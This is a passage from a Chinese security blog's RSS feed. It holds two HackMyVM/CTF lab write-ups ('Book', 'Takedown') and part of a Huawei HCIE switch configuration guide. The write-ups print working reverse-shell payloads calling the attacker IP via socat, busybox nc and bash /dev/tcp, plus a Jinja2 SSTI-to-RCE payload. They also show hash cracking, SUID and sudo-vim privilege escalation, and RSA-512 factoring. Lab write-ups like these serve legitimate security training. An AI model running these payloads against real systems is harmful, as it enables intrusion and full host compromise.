**执行Payload:**

```bash
# 利用 socat 反弹 shell
https://192.168.205.142/?cmd=socat TCP:192.168.205.128:8888 EXEC:$(which $(echo $0))
```

成功接收到 `www-data` 用户的shell后，为了便于操作，使用以下命令序列来获得一个功能完整的TTY。

```bash
script /dev/null -c bash
# 按下 Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **三、权限提升**

## **1. www-data -&gt; room**

在 `www-data` shell中，查看 `/home` 目录发现存在用户 `room`。尝试使用弱口令 `room` 进行用户切换，成功切换到 `room` 用户。

```bash
www-data@Book:/home$ su room 
Password: room
room@Book:/home$ id
uid=1001(room) gid=1001(room) groups=1001(room)
```

## **2. room -&gt; root**

1. **本地服务发现:** 成为 `room` 用户后，使用 `ss -tnlp` 命令发现本地 `127.0.0.1` 的 `8888` 端口上运行着一个服务。

   ```bash
   room@Book:~$ ss -tnlp
   State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
   ...     
   LISTEN    0         128              127.0.0.1:8888             0.0.0.0:*
   ...
   ```

   通过 `wget` 访问该服务，发现是一个 Jupyter Server 的登录页面。

2. **凭证发现与破解:** 在 `/var/backups/` 目录下找到一个Jupyter的配置文件 `jupyter_server_config.json`，其中包含一个 `argon2` 格式的哈希密码。

   ```bash
   room@Book:/var/backups$ cat jupyter_server_config.json
   {
     'IdentityProvider': {
       'hashed_password': 'argon2:$argon2id$v=19$m=10240,t=10,p=8$FLuM1EM1nn/EP9ni1ust1A$BSnZUgXixY8B0Tzmffcz/9Zo9cvEO/PeAu8zw/iYNI4'
     }
   }
   ```

   使用 `Argon2Cracker` 工具和字典对该哈希进行破解，成功得到明文密码 `star123`。

   &gt; [!Tip]
   &gt;
   &gt; https://github.com/p0dalirius/Argon2Cracker

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/Argon2Cracker]
   └─$ python3 Argon2Cracker.py '$argon2id$v=19$m=10240,t=10,p=8$FLuM1EM1nn/EP9ni1ust1A$BSnZUgXixY8B0Tzmffcz/9Zo9cvEO/PeAu8zw/iYNI4' -w ../5000h.txt  
   ...
   [&gt;] Found: star123
   ```

3. **获取Root权限:**

   * 在Kali上，使用SSH的本地端口转发功能，将目标主机的8888端口映射到本地。

     ```bash
     ssh -L 8888:127.0.0.1:8888 room@192.168.205.142
     ```

   * 打开本地浏览器访问 `http://127.0.0.1:8888`，进入Jupyter登录页面，输入破解出的密码 `star123` 成功登录。

   * Jupyter Server在此处是以 `root` 权限运行的。通过 `File &gt; New &gt; Terminal` 创建一个新的终端，直接获得 `root` 权限的shell。

   * 最后，在 `root` shell中读取两个flag文件。

     ```bash
     root@Book:~# id
     uid=0(root) gid=0(root) groups=0(root)
     root@Book:~# cat /root/root.txt /home/room/user.txt 
     flag{root-4f98663772651c870e911982e991d0d9}
     flag{user-a81e1f271bc4a3dd4ac87827da4d0a78}
     ```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Book.html</guid><pubDate>Thu, 14 Aug 2025 23:48:15 +0000</pubDate></item><item><title>hmv_Takedown</title><link>https://7r1UMPHK.github.io/post/hmv_Takedown.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先使用 `arp-scan` 在本地网络中确定目标主机的IP地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:77:f8:3a     PCS Systemtechnik GmbH
...
```

**端口扫描:**

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.131
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

扫描结果显示，目标主机IP为 `192.168.205.131`，开放了 **22 (SSH)** 和 **80 (HTTP)** 端口。

## **2. Web服务侦察**

访问 `http://192.168.205.131`，服务器返回301重定向，指向域名 `http://shieldweb.che/`。

将域名与IP地址绑定到 `/etc/hosts` 文件后，进行子域名爆破，发现一个重要的子域名 `ticket.shieldweb.che`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/hosts
# 添加以下行
192.168.205.131 shieldweb.che ticket.shieldweb.che

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wfuzz -c -u 'http://shieldweb.che' -H 'HOST:FUZZ.shieldweb.che' -w /path/to/wordlist.txt --hw 11
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                          
=====================================================================
000000453:   200        94 L     180 W      2129 Ch     'ticket - ticket'
...
```

再次访问 `http://ticket.shieldweb.che`，发现一个联系表单页面。目录扫描显示存在 `/submit` 路径。

# **二、漏洞发现与初始访问**

## **1. SSTI (服务器端模板注入)**

在联系表单的 `name` 字段中输入 `{{7*7}}` 并提交到 `/submit` 端点，返回结果中显示了 `49`。这证实了该表单存在 **Jinja2 服务器端模板注入 (SSTI)** 漏洞。

**漏洞验证:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://ticket.shieldweb.che/submit -X POST -d 'name={{7*7}}&amp;email=a&amp;message=a'
...
&lt;div class='response success'&gt;
    Thank you for your message, 49!
&lt;/div&gt;
...
```

## **2. SSTI 到 RCE**

利用SSTI漏洞，构造Payload以执行远程代码。通过遍历Python对象，可以调用 `os.popen` 来执行系统命令。

**执行 `id` 命令:**

```bash
# Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://ticket.shieldweb.che/submit -X POST -d 'name=%7B%7B%20self.__init__.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%20%7D%7D&amp;email=1&amp;message=1'
...

&lt;div class='response success'&gt;
    Thank you for your message, uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
!
&lt;/div&gt;

...
```

命令成功以 `root` 用户身份在一个容器内执行。

## **3. 获取反弹Shell (Docker内)**

构造反弹Shell的Payload，在本地Kali开启监听，成功获取一个Docker容器内的 `root` 权限Shell。

**本地监听:**

```bash
nc -lvnp 8888
```

**执行反弹Shell Payload:**（去web执行，不然会有**shell 解析问题**）

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.205.128 8888 -e $(which $(echo $0)) ').read() }}
```

**稳定shell：**

```bash
python -c 'import pty; pty.spawn('ash')'
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=ash
stty rows 24 columns 80
```

# **三、权限提升**

## **1. 容器逃逸 (Docker -&gt; love)**

在获得的Docker Shell中进行信息收集，发现 `/var/log/access.yml` 文件中记录了一条可疑的 `cron` 计划任务。

```bash
/var/log # cat access.yml
...
2023-08-31 22:45:00 - Usuario: A.love - Accion: Tarea cron ejecutada: */5 * * * * root bash /home/love/script/*
...
```

该任务每5分钟以 `root` 权限执行 `/home/love/script/` 目录下的所有脚本。通过 `linpeas.sh` 等工具或手动 `mount` 检查，发现宿主机的 `/home/love/script` 被挂载到了容器的 `/script` 目录，并且该目录可写。这是一个典型的容器逃逸路径。

1. 在容器的 `/script` 目录下创建一个反弹Shell脚本。

   ```bash
   /script # echo 'bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'' &gt; 
   a.sh
   /script # chmod +x a.sh 
   ```

2. 在本地Kali开启 `8888` 端口监听。等待cron任务执行后，成功接收到宿主机 `love` 用户的Shell。

## **2. love -&gt; mitnick**

在 `love` 用户的Shell中，执行 `sudo -l` 发现其可以免密以 `mitnick` 用户身份运行一个名为 `sas` 的程序。

```bash
love@osiris:~$ sudo -l
...
User love may run the following commands on osiris:
    (mitnick) NOPASSWD: /home/mitnick/sas
```

运行 `/home/mitnick/sas` 后进入一个受限的自定义shell。该shell内置了 `run` 命令，可以执行外部脚本。

1. 在 `/tmp` 目录创建一个脚本，用于复制 `/bin/bash` 并为其赋予SUID权限。

   ```bash
   love@osiris:/tmp$ echo 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh' &gt; a.sh
   love@osiris:/tmp$ chmod +x a.sh
   ```

2. 通过 `sas` shell执行该脚本。

   ```bash
   love@osiris:~$ sudo -u mitnick /home/mitnick/sas
   # run /tmp/a.sh
   ```

3. 执行 `/tmp/sh -p`，成功获得 `mitnick` 用户的有效权限。

## **3. mitnick -&gt; tomu**

在 `mitnick` 用户的家目录下，发现一个公钥文件 `publickey.pub` 和一个加密文件 `secret.enc`。通过查看`publickey.pub`可以发现这是一个非常短的 RSA 公钥，长度只有 **512 位**，这意味着**可以用 RSA 因数分解攻击直接爆破私钥**。

1. 将这两个文件传输到本地Kali攻击机。

2. 使用 `RsaCtfTool` 工具，利用公钥来解密文件。

   ```bash
   ┌──(kali㉿kali)-[~]
   └─$ RsaCtfTool --publickey publickey.pub --decryptfile secret.enc --private
   ...
   utf-8 : sh1m0mur4Bl4ckh4t
   ...
   ```

3. 成功解密出密码：`sh1m0mur4Bl4ckh4t`。

4. 在 `/home` 目录下发现另一用户 `tomu`。使用刚解出的密码成功切换到 `tomu` 用户。

## **4. tomu -&gt; root**

在 `tomu` 用户的Shell中，再次执行 `sudo -l`，发现可以免密以 `root` 身份运行 `/opt/Contempt/Contempt`。

```bash
tomu@osiris:~$ sudo -l
...
User tomu may run the following commands on osiris:
    (root) /opt/Contempt/Contempt
```

执行该程序后，出现一个菜单。选择 `2` (Ayuda) 会使用 `vim` 打开帮助文档。`vim` 在以`sudo`权限运行时，可以通过内部命令逃逸到shell。

1. 执行提权命令。

   ```bash
   tomu@osiris:~$ sudo /opt/Contempt/Contempt
   ```

2. 在程序菜单中选择 `2`，进入 `vim` 界面。

3. 在 `vim` 命令模式下，输入 `!bash` 或 `!sh` 并回车。

   ```vim
   :!bash
   ```

4. 成功获取 `root` 权限的交互式Shell。

**最终在 `/root` 和 `/home/tomu` 目录下找到flag。**

```bash
root@osiris:~# cat /root/root.sh
...
flag --&gt; 1e271c5ce97e76ae8417a95c74085fba
...
root@osiris:~# cat /home/tomu/user.txt
612701a03669485d94bc687449fdab39
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Takedown.html</guid><pubDate>Thu, 14 Aug 2025 01:42:42 +0000</pubDate></item><item><title>HCIE-Q1</title><link>https://7r1UMPHK.github.io/post/HCIE-Q1.html</link><description>![image-20250811083621208](http://7r1UMPHK.github.io/image/20250813214159666.webp)

# 1 部署网络可靠性

## 1.1 配置交换机堆叠

*ps:堆叠ensp做不了，暂时不管*

### X_T2_AGG1-2

重启1-2，保证1为主

```
reboot fast
```

### X_T2_AGG1-1

```
stack slot 0 priority 200
int stack-port 0/1
port int X0/0/1 en
shut int X0/0/1
q
int stack-port 0/2
port int X0/0/2 en
shut int X0/0/2
q
```

### X_T2_AGG1-2

```
int stack-port 0/1
port int X0/0/2 en
q
int stack-port 0/2
port int X0/0/1 en
q
q
```

### X_T2_AGG1-1

```
--打开X_T2_AGG1-1堆叠互联接口(建议直接复制)--
int stack-port 0/1
undo shut int X0/0/1
q
int stack-port 0/2
undo shut int X0/0/2
q
----------------------------
sys X_T2_AGG1
dis stack
```

![image-20250811083042852](http://7r1UMPHK.github.io/image/20250813214156783.webp)

&gt; [!TIP]
&gt; 主备倒换:
&gt;
&gt; slave switchover enable
&gt;
&gt; slave switchover
&gt;
&gt; 重置堆叠:
&gt;
&gt; reset stack configuration

*ps:当配置堆叠有误，建议直接重置堆叠*

## 1.2 配置链路聚合

![image-20250811083741031](http://7r1UMPHK.github.io/image/20250813214149499.webp)

*ps:配置链路聚合时注意使用dis ll n b查看互联接口，根据实际情况而定，切勿死记接口编号*

先将相关设备改名，开启lldp

### 批量

```
sys
sys *
ll en
```

### Core

```
[X_T1_Core1]dis lldp neighbor  brief 
Local Intf   Neighbor Dev             Neighbor Intf             Exptime
GE0/0/11     X_T2_AGG1                GE0/0/13                  93     
GE0/0/12     X_T2_AGG1                GE0/0/14                  93     
GE0/0/13     X_T1_AGG1                GE0/0/13                  95     
GE0/0/14     X_T1_AGG1                GE0/0/14                  95     
GE0/0/21     X_T2_AGG1                GE0/0/23                  93     
GE0/0/22     X_T2_AGG1                GE0/0/24                  93     
GE0/0/23     X_T1_AGG1                GE0/0/23                  95     
GE0/0/24     X_T1_AGG1                GE0/0/24                  92    
```

13，14，23，24是eth1的，通常来说是预配的，检查

```
[X_T1_Core1]dis eth
Local:
LAG ID: 1                   WorkingMode: STATIC                               
Preempt Delay: Disabled     Hash arithmetic: According to SIP-XOR-DIP         
System Priority: 32768      System ID: 4c1f-cc7a-6702                         
Least Active-linknumber: 1  Max Active-linknumber: 8                          
Operate status: up          Number Of Up Port In Trunk: 4                     
--------------------------------------------------------------------------------
ActorPortName          Status   PortType PortPri PortNo PortKey PortState Weight
GigabitEthernet0/0/13  Selected 1GE      32768   14     305     10111100  1     
GigabitEthernet0/0/14  Selected 1GE      32768   15     305     10111100  1     
GigabitEthernet0/0/23  Selected 1GE      32768   24     305     10111100  1     
GigabitEthernet0/0/24  Selected 1GE      32768   25     305     10111100  1   
```

那直接配置eth2

```
int eth 2
mode lacp
tr g 0/0/11 0/0/12 0/0/21 0/0/22
q
```

### T2

也是批量打开X_T2_AGG1、X_T2_ACC1、X_T2_ACC2的lldp协议

```
sys
sys *
ll en
```

然后依旧是使用lldp显示出了连接信息配置链路聚合

#### X_T2_AGG1

```
int eth 1
mode lacp
tr g 0/0/13 0/0/14 0/0/23 0/0/24
q
int eth 2
mode lacp
tr g 0/0/11 0/0/21
int eth 3
mode lacp
tr g 0/0/12 0/0/22
q
```

#### X_T2_ACC1

```
int eth 1
mode lacp
tr g 0/0/23 0/0/24
q
```

#### X_T2_ACC2

```
int eth 1
mode lacp
tr g 0/0/23 0/0/24
q
```

![image-20250811085948464](http://7r1UMPHK.github.io/image/20250813214145946.webp)

# 2-3 基本业务需求与VPN实例配置

![image-20250811090108661](http://7r1UMPHK.github.io/image/20250813214144023.webp)

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

## 创建VPN实例

### Core

```
ip v Employee
rou 65001:1
q
q
ip v Guest
rou 65001:2
q
q
```

## 配置VPN与IP

### X_T1_Export2

```
vlan 202
int g6/0/1
p l a
p d v 202
int vlan202
ip add 10.1.200.5 30
int g0/0/0
ip add 10.255.3.1 24
int g0/0/1
ip add 10.255.4.1 24
int l0
ip add 10.1.0.2 32
q
```

### X_T1_Core1

*ps:配置vlan的那里，建议直接开个txt文本修改，那样快一点*

```
v b 60 201 to 209 51 to 55 100 to 105
# 我预配有问题，他X_T1_Core1是a口，X_T1_Export1是t口，我统一一下，不然等会OSPF邻居会卡Init
int g0/0/1
undo port default vlan
undo port link-type
p l t
p t a v 201
int g0/0/2
p l a
p d v 202
int g0/0/3
p t a v 51 to 55 100 to 105 203
int g0/0/4
p l t 
p t a v 204 205
un p t a v 1
int g0/0/5
p l t
p t a v 206 207
un p t a v 1
int g0/0/6
p l a
p d v 60
int vlan60
ip bin vpn-ins Employee
ip add 10.1.60.254 24
int eth2
p l t
p t a v 100 209
q
dhcp en

int vlan202
ip add 10.1.200.6 30
int vlan204
ip add 10.1.200.13 30
int vlan205
ip add 10.1.200.17 30
int vlan206
ip bin vpn-ins Employee
ip add 10.1.200.21 30
int vlan207
ip bin vpn-ins Guest
ip add 10.1.200.25 30
int vlan208
ip bin vpn-ins Employee
ip add 10.1.200.29 30
dhcp select global
int vlan209
ip bin vpn-ins Employee
ip add 10.1.200.33 30
dhcp select global

int l1
ip bin vpn-ins Employee
ip add 10.1.0.4 32
int l2
ip bin vpn-ins Guest
ip add 10.1.0.5 32

int vlan51
ip bin vpn-ins Employee
ip add 10.1.51.254 24
dhcp select global
int vlan 52
ip bin vpn-ins Employee
ip add 10.1.52.254 24
dhcp select global
int vlan53
ip bin vpn-ins Employee
ip add 10.1.53.254 24
dhcp select global
int vlan 54
ip bin vpn-ins Employee
ip add 10.1.54.254 24
dhcp select global
int vlan 55
ip bin vpn-ins Employee
ip add 10.1.55.254 24
dhcp select global

int vlan 101
ip bin vpn-ins Guest
ip add 10.1.101.254 24
dhcp select global
int vlan 102
ip bin vpn-ins Guest
ip add 10.1.102.254 24
dhcp select global
int vlan 103
ip bin vpn-ins Guest
ip add 10.1.103.254 24
dhcp select global
int vlan 104
ip bin vpn-ins Guest
ip add 10.1.104.254 24
dhcp select global
int vlan 105
ip bin vpn-ins Guest
ip add 10.1.105.254 24
dhcp select global
q
```

&gt; [!TIP]
&gt;
&gt; 检查命令：
&gt;
&gt; dis ip vpn-in ver 查看VPN实例绑定的接口

### X_T1_AGG1

```
v b 11 to 15 21 to 25 100 208
int eth2
p h t v 11 to 15 21 to 25 100
int eth3
p h t v 11 to 15 21 to 25
q
```

### X_T2_AGG1

```
v b 100 209 31 to 35 41 to 45
int eth 1
p l t
p t a v 100 209
int eth 2
p h t v 31 to 35 41 to 45
int eth 3
p h t v 100 31 to 35 41 to 45
int vlan 209
ip add 10.1.200.34 30
int l0
ip add 10.1.0.7 32
q
```

### X_T1_ACC1

```
vlan 100
q
int g0/0/22
p l a
p d v 100
int eth 1
p l t
p t a v 100
q
```

### X_T2_ACC2

```
vlan 100
int eth 1
p l t
p t a v 100
int g0/0/22
p l a
p d v 100
q
```

*ps:如果g1-20空非hybrid，则需要改回hybrid*

### X_T1_AC1

```
v b 51 to 55 100 to 105
dhcp en
int vlan 100
ip add 10.1.100.254 255.255.255.0
dhcp select inter
int g0/0/1
p t a v 51 to 55 101 to 105 100 203
q
```

&gt; [!TIP]
&gt;
&gt; 检查命令：
&gt;
&gt; dis vlan sum 检查vlan
&gt;
&gt; dis port vlan 检查vlan划分
&gt;
&gt; dis ip in b      检查ip

# 4 核心交换机DHCP地址池配置

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

## Core

```
ip pool market11
vpn-in Employee
gate 10.1.11.254
net 10.1.11.0 mask 255.255.255.0
ip pool market12
vpn-in Employee
gate 10.1.12.254
net 10.1.12.0 mask 255.255.255.0
ip pool market13
vpn-in Employee
gate 10.1.13.254
net 10.1.13.0 mask 255.255.255.0
ip pool market14
vpn-in Employee
gate 10.1.14.254
net 10.1.14.0 mask 255.255.255.0
ip pool market15
vpn-in Employee
gate 10.1.15.254
net 10.1.15.0 mask 255.255.255.0

ip pool procure21
vpn-in Employee
gate 10.1.21.254
net 10.1.21.0 mask 255.255.255.0
ip pool procure22
vpn-in Employee
gate 10.1.22.254
net 10.1.22.0 mask 255.255.255.0
ip pool procure23
vpn-in Employee
gate 10.1.23.254
net 10.1.23.0 mask 255.255.255.0
ip pool procure24
vpn-in Employee
gate 10.1.24.254
net 10.1.24.0 mask 255.255.255.0
ip pool procure25
vpn-in Employee
gate 10.1.25.254
net 10.1.25.0 mask 255.255.255.0

ip pool finance31
vpn-in Employee
gate 10.1.31.254
net 10.1.31.0 mask 255.255.255.0
ip pool finance32
vpn-in Employee
gate 10.1.32.254
net 10.1.32.0 mask 255.255.255.0
ip pool finance33
vpn-in Employee
gate 10.1.33.254
net 10.1.33.0 mask 255.255.255.0
ip pool finance34
vpn-in Employee
gate 10.1.34.254
net 10.1.34.0 mask 255.255.255.0
ip pool finance35
vpn-in Employee
gate 10.1.35.254
net 10.1.35.0 mask 255.255.255.0

ip pool hr41
vpn-in Employee
gate 10.1.41.254
net 10.1.41.0 mask 255.255.255.0
ip pool hr42
vpn-in Employee
gate 10.1.42.254
net 10.1.42.0 mask 255.255.255.0
ip pool hr43
vpn-in Employee
gate 10.1.43.254
net 10.1.43.0 mask 255.255.255.0
ip pool hr44
vpn-in Employee
gate 10.1.44.254
net 10.1.44.0 mask 255.255.255.0
ip pool hr45
vpn-in Employee
gate 10.1.45.254
net 10.1.45.0 mask 255.255.255.0

ip pool employee51
vpn-in Employee
gate 10.1.51.254
net 10.1.51.0 mask 255.255.255.0
ip pool employee52
vpn-in Employee
gate 10.1.52.254
net 10.1.52.0 mask 255.255.255.0
ip pool employee53
vpn-in Employee
gate 10.1.53.254
net 10.1.53.0 mask 255.255.255.0
ip pool employee54
vpn-in Employee
gate 10.1.54.254
net 10.1.54.0 mask 255.255.255.0
ip pool employee55
vpn-in Employee
gate 10.1.55.254
net 10.1.55.0 mask 255.255.255.0

ip pool Guest101
vpn-in Guest
gate 10.1.101.254
net 10.1.101.0 mask 255.255.255.0
ip pool Guest102
vpn-in Guest
gate 10.1.102.254
net 10.1.102.0 mask 255.255.255.0
ip pool Guest103
vpn-in Guest
gate 10.1.103.254
net 10.1.103.0 mask 255.255.255.0
ip pool Guest104
vpn-in Guest
gate 10.1.104.254
net 10.1.104.0 mask 255.255.255.0
ip pool Guest105
vpn-in Guest
gate 10.1.105.254
net 10.1.105.0 mask 255.255.255.0
q
```

&gt; [!TIP]
&gt;
&gt; 检查命令:
&gt;
&gt; dis ip pool vpn-ins Employee
&gt;
&gt; dis ip pool vpn-ins Guest

# 5 核心交换机VLAN地址池配置

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

*ps:这和堆叠ensp都做不了，暂时不管，或者你去AC做测试，那个可以*

## X_T1_AGG1

```
vlan pool market
vlan 11 to 15
vlan pool procure
vlan 21 to 25
q
```

## X_T2_AGG1

```
vlan pool finance
vlan 31 to 35
vlan pool hr
vlan 41 to 45
q
```

## X_T1_AC1

```
vlan pool employee
vlan 51 to 55
vlan pool Guest
vlan 101 to 105
q
```

&gt; [!TIP]
&gt;
&gt; 检查命令:
&gt;
&gt; dis vlan pool all

# 6 三层设备OSPF配置

## 6.1 核心与出口路由器的OSPF配置

### X_T1_Export1

```
ospf 1 rou 10.1.0.1
default-route-advertise always
a 0
net 10.1.0.1 0.0.0.0
net 10.1.200.1 0.0.0.0
q
q
```

### X_T1_Export2

```
ospf 1 rou 10.1.0.2
default-
a 0
net 10.1.0.2 0.0.0.0
net 10.1.200.5 0.0.0.0
q
q
```

### X_T1_Core1

```
ospf 1 rou 10.1.0.3
a 0
net 10.1.0.3 0.0.0.0
net 10.1.200.2 0.0.0.0
net 10.1.200.6 0.0.0.0
net 10.1.200.9 0.0.0.0
q
a 1
net 10.1.200.13 0.0.0.0
q
a 2
net 10.1.200.17 0.0.0.0
q
q
ospf 2 rou 10.1.0.4 vpn-ins Employee
vpn-inst simple
silent-int vlan51
silent-int vlan52
silent-int vlan53
silent-int vlan54
silent-int vlan55
silent-int vlan60
a 1
net 10.1.0.0 0.0.255.255
q
q
ospf 3 rou 10.1.0.5 vpn-ins Guest
vpn-inst simple
silent-int vlan101
silent-int vlan102
silent-int vlan103
silent-int vlan104
silent-int vlan105
a 2
net 10.1.0.0 0.0.255.255
q
q
```

## 6.2 T1汇聚的OSPF配置

### 6.2.1 DHCP配置

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

#### X_T1_AGG1

基础配置前面**2 基础业务需求**已经配置过了

*ps:打开你的记事本，ctrl+c，ctrl+v，哈哈哈*

```
dhcp en
int vlan 11
ip add 10.1.11.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 12
ip add 10.1.12.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 13
ip add 10.1.13.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 14
ip add 10.1.14.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 15
ip add 10.1.15.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29

int vlan 21
ip add 10.1.21.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 22
ip add 10.1.22.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 23
ip add 10.1.23.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 24
ip add 10.1.24.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 25
ip add 10.1.25.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
q
```

##### 检查

![image-20250811170247422](http://7r1UMPHK.github.io/image/20250813214119189.webp)

![image-20250811170400091](http://7r1UMPHK.github.io/image/20250813214117533.webp)

### 6.2.2 OSPF 配置

#### X_T1_AGG1

```
ospf 1 rou 10.1.0.6
silent-int vlan 11
silent-int vlan 12
silent-int vlan 13
silent-int vlan 14
silent-int vlan 15
silent-int vlan 21
silent-int vlan 22
silent-int vlan 23
silent-int vlan 24
silent-int vlan 25
a 1
net 10.1.0.0 0.0.255.255
q
q
```

## 6.3 汇聚的OSPF 配置

### 6.3.1 DHCP配置

#### X_T2_AGG1

基础配置前面**2 基础业务需求**已经配置过了

```
dhcp en
int vlan 31
ip add 10.1.31.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 32
ip add 10.1.32.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 33
ip add 10.1.33.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 34
ip add 10.1.34.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 35
ip add 10.1.35.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33

int vlan 41
ip add 10.1.41.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 42
ip add 10.1.42.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 43
ip add 10.1.43.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 44
ip add 10.1.44.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 45
ip add 10.1.45.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
q
```

##### 检查

![image-20250812104327092](http://7r1UMPHK.github.io/image/20250813214115137.webp)

![image-20250812104359037](http://7r1UMPHK.github.io/image/20250813214113229.webp)

### 6.3.2 OSPF 配置

#### X_T2_AGG1

```
ospf 1 rou 10.1.0.7
silent-int vlan 31
silent-int vlan 32
silent-int vlan 33
silent-int vlan 34
silent-int vlan 35
silent-int vlan 41
silent-int vlan 42
silent-int vlan 43
silent-int vlan 44
silent-int vlan 45
a 1
net 10.1.0.0 0.0.255.255
q
q
```

#### X_T1_AC1

*ps:可能会有人问，为什么我都没有配置ip就直接配ospf，是因为他是预配的，你可以看看AC1的ip表*

```
ospf 1 rou 10.1.0.11
a 0
net 10.1.0.11 0.0.0.0
net 10.1.200.10 0.0.0.0
q
q
```

# 7 防火墙配置

## 7.1虚拟系统配置

### X_T1_FW1

&gt; [!TIP]
&gt;
&gt; 默认密码：
&gt;
&gt; admin:Admin@123

```
v b 204 to 207
int g1/0/1
Portsw
p l t
p t a v 204 to 205
un p t a v 1
int g1/0/2
Portsw
p l t
p t a v 206 to 207
un p t a v 1
q
```

### 检查

![image-20250812111534076](http://7r1UMPHK.github.io/image/20250813214111296.webp)

```
int l1
int l2
q
vsys en
vsys name Employee
assign int l1
assign vlan 204
assign vlan 206
int vlan 204
ip add 10.1.200.14 255.255.255.252
int vlan 206
ip add 10.1.200.22 255.255.255.252
int l1
ip add 10.1.0.8 255.255.255.255
q
```

### 检查

![image-20250812154330726](http://7r1UMPHK.github.io/image/20250813214109918.webp)

```
switch vsys Employee
sy
firewall zone trust
add int vlan 206
firewall zone untrust
add int vlan 204
security-po
rule name ospf
source-z trust untrust local
destination-zone trust untrust local
service ospf
action permit
q
q
quit
quit
vsys en
vsys na Guest
assign int l2
assign vlan 205
assign vlan 207
int vlan 205
ip add 10.1.200.18 255.255.255.252
int vlan 207
ip add 10.1.200.26 255.255.255.252
int l2
ip add 10.1.0.9 255.255.255.255
q

switch vsys Guest
sy
firewall zone trust
add int vlan 207
firewall zone untrust
add int vlan 205
security-po
rule name ospf
source-z trust untrust local
destination-zone trust untrust local
service ospf
action permit
q
q
quit
quit
```

## 7.2 OSPF 的配置

### X_T1_FW1

```
ospf 1 rou 10.1.0.8 vpn-ins Employee
vpn-instance-cap simple
a 1
net 10.1.0.8 0.0.0.0
net 10.1.200.14 0.0.0.0
net 10.1.200.22 0.0.0.0
q
q

ospf 2 rou 10.1.0.9 vpn-ins Guest
vpn-instance-cap simple
a 2
net 10.1.0.9 0.0.0.0
net 10.1.200.18 0.0.0.0
net 10.1.200.26 0.0.0.0
q
q
```

### 验证

去core查看ospf peer

![image-20250812165616221](http://7r1UMPHK.github.io/image/20250813214106871.webp)

一共9个，全部full

# 8 核心交换机过滤指定3类LSA AND 配置 NSSA 区域

*ps:还是建议记事本复制大法*

## X_T1_Core1

```
ip ip-prefix Employee deny 10.1.11.0 24
ip ip-prefix Employee deny 10.1.12.0 24
ip ip-prefix Employee deny 10.1.13.0 24
ip ip-prefix Employee deny 10.1.14.0 24
ip ip-prefix Employee deny 10.1.15.0 24

ip ip-prefix Employee deny 10.1.21.0 24
ip ip-prefix Employee deny 10.1.22.0 24
ip ip-prefix Employee deny 10.1.23.0 24
ip ip-prefix Employee deny 10.1.24.0 24
ip ip-prefix Employee deny 10.1.25.0 24

ip ip-prefix Employee deny 10.1.31.0 24
ip ip-prefix Employee deny 10.1.32.0 24
ip ip-prefix Employee deny 10.1.33.0 24
ip ip-prefix Employee deny 10.1.34.0 24
ip ip-prefix Employee deny 10.1.35.0 24

ip ip-prefix Employee deny 10.1.41.0 24
ip ip-prefix Employee deny 10.1.42.0 24
ip ip-prefix Employee deny 10.1.43.0 24
ip ip-prefix Employee deny 10.1.44.0 24
